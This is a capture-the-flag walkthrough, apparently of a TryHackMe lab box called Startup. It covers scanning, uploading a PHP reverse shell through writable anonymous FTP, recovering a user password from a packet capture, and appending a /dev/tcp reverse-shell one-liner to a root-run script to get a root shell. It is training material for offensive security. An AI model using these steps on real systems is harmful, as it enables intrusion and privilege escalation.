#### IP `10.10.241.74`


#### 1. First of all and as always we run nmap:
```
──(kali㉿kali)-[~]
└─$ nmap -Pn -A -T4 10.10.241.74
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 13:53 EST
Warning: 10.10.241.74 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.241.74
Host is up (0.20s latency).
Not shown: 994 closed ports
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.6.46.150
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp    open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
900/tcp   filtered omginitialrefs
5906/tcp  filtered unknown
11110/tcp filtered sgi-soap
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.73 seconds
                                                                     
```

These ports are open:
```
21
22
80
900
5906
1111
```


#### 2. Secondly, it is always good to run gobuster to get a list of directories available and also check `/robots.txt` 

```
sgobuster dir -u http://10.10.241.74 -w /usr/share/wordlists/dirb/common.txt ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.241.74
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/10 13:52:52 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/files (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/10 13:54:58 Finished
===============================================================
```

It seems that there is a directory `/files` however, after a quick look there is nothing helpful there. These are files visible from ftp, so we will benefir from it in next point.
                                                                       


#### 3. We come back to ftp port.

We login as `Anonymous` and tap enter while prompted for password. Command `dir` shows available files (with no useful informations) but there is also `ftp` directory where anonymous user has writing permission.

In this case we will try to get a shell with netcat and reverse php:

- we save pentest monkey's  (or a one liner) reverse shell script as `shell.php`
- run netcat in separate terminal `sudo nc -lvnp 4444`
- upload `shell.php` to ftp directory with `put shell.php`
- open `http://10.10.241.74/files/ftp/shell.php` in a browser, click on it and get shell as `www-data`

There is a file called recipe.txt, so quick `cat` to answer first question:
```
ww-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was XXXX
```


#### 4. Indicents directory

Besides `recipe.txt` there is a directory named `incidents`

```
www-data@startup:/$ ls -lah
ls -lah
total 100K
drwxr-xr-x  25 root     root     4.0K Jan 10 18:52 .
drwxr-xr-x  25 root     root     4.0K Jan 10 18:52 ..
drwxr-xr-x   2 root     root     4.0K Sep 25 08:12 bin
drwxr-xr-x   3 root     root     4.0K Sep 25 08:12 boot
drwxr-xr-x  16 root     root     3.5K Jan 10 18:51 dev
drwxr-xr-x  96 root     root     4.0K Nov 12 05:08 etc
drwxr-xr-x   3 root     root     4.0K Nov 12 04:53 home
drwxr-xr-x   2 www-data www-data 4.0K Nov 12 04:53 incidents
lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root       33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root     4.0K Sep 25 08:22 lib
drwxr-xr-x   2 root     root     4.0K Sep 25 08:10 lib64
drwx------   2 root     root      16K Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 media
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 mnt
drwxr-xr-x   2 root     root     4.0K Sep 25 08:09 opt
dr-xr-xr-x 128 root     root        0 Jan 10 18:51 proc
-rw-r--r--   1 www-data www-data  136 Nov 12 04:53 recipe.txt
drwx------   4 root     root     4.0K Nov 12 04:54 root
drwxr-xr-x  25 root     root      920 Jan 10 19:13 run
drwxr-xr-x   2 root     root     4.0K Sep 25 08:22 sbin
drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 snap
drwxr-xr-x   3 root     root     4.0K Nov 12 04:52 srv
dr-xr-xr-x  13 root     root        0 Jan 10 19:19 sys
drwxrwxrwt   7 root     root     4.0K Jan 10 19:23 tmp
drwxr-xr-x  10 root     root     4.0K Sep 25 08:09 usr
drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 vagrant
drwxr-xr-x  14 root     root     4.0K Nov 12 04:52 var
lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ 
```

and `suspicious.pcapng` file which looks like wireshark's packet file but do not get confused :)

```
www-data@startup:/incidents$ ls -lah
ls -lah
total 40K
drwxr-xr-x  2 www-data www-data 4.0K Nov 12 04:53 .
drwxr-xr-x 25 root     root     4.0K Jan 10 18:52 ..
-rwxr-xr-x  1 www-data www-data  31K Nov 12 04:53 suspicious.pcapng
```

#### 5. Investigating the file.

I quickly run a python http server `python3 -m http.server` and downloade a file to my local machine, as there is no `strings` command installed on a box.

Here is what we have:

```
$ strings suspicious.pcapng              

Qcd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
lennie
www-data@startup:/home$ 
cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ |
.?:MD
sudo -l
sudo -l
[sudo] password for www-data: 
c4nXXXXXXXXXc3
6%	@
Sorry, try again.
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4nXXXXXXXXXc3
sudo: 3 incorrect password attempts
www-data@startup:/home$ |
```

A giant file with some logs. Once we have a deeper look at it, among  different commands there is a username `lennie` and passswordlike word, which in the end turns out to ba that user's pass (it is very illogic for me)


#### 6. Enumaration while logged as `lennie`

I run `linpeas.sh` in order to get some useful informations, however did not find anything. 

Our user `lennie` has permissions to run `/etc/print.sh` script so by appending a reverse shell onliner and running netcat, there is a chance to get another shell as root.

I type `echo "bash -i &>/dev/tcp/$MYIP/$NCPORT <&1" >> /etc/print.sh`

```
lennie@startup:~$ echo "bash -i &>/dev/tcp/10.6.46.150/4444 <&1" >> /etc/print.s 
lennie@startup:~$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
bash -i &>/dev/tcp/10.6.46.150/4444 <&1
lennie@startup:~$ 

```

wait a little and bingo:

```
──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.6.46.150] from (UNKNOWN) [10.10.212.41] 54316
bash: cannot set terminal process group (1402): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Nov 12 04:54 .
drwxr-xr-x 25 root root 4096 Jan 10 20:23 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Nov 12 04:54 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12 04:53 root.txt
drwx------  2 root root 4096 Nov 12 04:50 .ssh
root@startup:~# cat root.txt
cat root.txt
THM{f963XXXXXXXXXXXXXXXXXXXXXXXX6d}
root@startup:~# 
```
